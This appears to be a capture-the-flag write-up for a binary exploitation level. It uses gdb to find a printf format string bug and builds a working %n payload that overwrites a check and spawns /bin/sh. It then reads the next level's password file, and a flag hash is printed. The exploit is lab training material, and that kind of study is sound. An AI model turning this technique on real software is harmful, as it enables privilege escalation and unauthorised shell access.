@@ -1,0 +1,71 @@
+
+██╗     ███████╗██╗   ██╗███████╗██╗         ██████╗ 
+██║     ██╔════╝██║   ██║██╔════╝██║         ╚════██╗
+██║     █████╗  ██║   ██║█████╗  ██║          █████╔╝
+██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║          ╚═══██╗
+███████╗███████╗ ╚████╔╝ ███████╗███████╗    ██████╔╝
+╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝    ╚═════╝ 
+
+
+gdb level3
+
+disas main
+-> 0x08048520 <+6>:	call   0x80484a4 <v>
+
+disas v
+-> 0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+->                      ...
+-> 0x08048513 <+111>:	call   0x80483c0 <system@plt>
+
+strings level3
+-> /bin/sh
+
+At this point, we know the program is using printf and probably running a /bin/sh command.
+The use of printf is interesting. Let's see if a Format String Bug is possible :
+
+./level3
+%x
+->200
+
+Yes it is. So we will use a Format String exploit.
+
+For more information:
+https://www.exploit-db.com/papers/23985/
+
+With disas main, we also see:
+-> 0x080484da <+54>:	mov    0x804988c,%eax
+-> 0x080484df <+59>:	cmp    $0x40,%eax
+
+He's comparing the address 0x804988c with the value 0x40.
+To run the /bin/sh command, this comparison must be correct.
+
+Let's start !
+First step, find the offset:
+
+./level3
+AAAA %x %x %x %x %x
+->AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520
+
+The offset is 4. So we will now use: %4
+
+To write on the address we need, we will use the %n modifier of printf:
+
+-The %4$n is writing at the address which is at the beginning of the string present at offset 4.
+This address will be: 0x0804988c.
+
+-The %4$n is writing the number of characters present before him.
+This number will be: 0x40. 
+
+So we have: printf(ADDRESS, VALUE %4$n)
+(The VALUE is including the size of the address herself. So don't forget to subtract 4 bytes from the value you want effectively write.)
+
+python -c "print '\x8c\x98\x04\x08' + 'A' * 60 + '%4\$n'" > /tmp/fichier
+
+cat /tmp/fichier - | ./level3
+
+cd ../level4 && cat .pass
+
+|══════════════════════════════════════════════════════════════════|
+| b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa |
+|══════════════════════════════════════════════════════════════════|
+
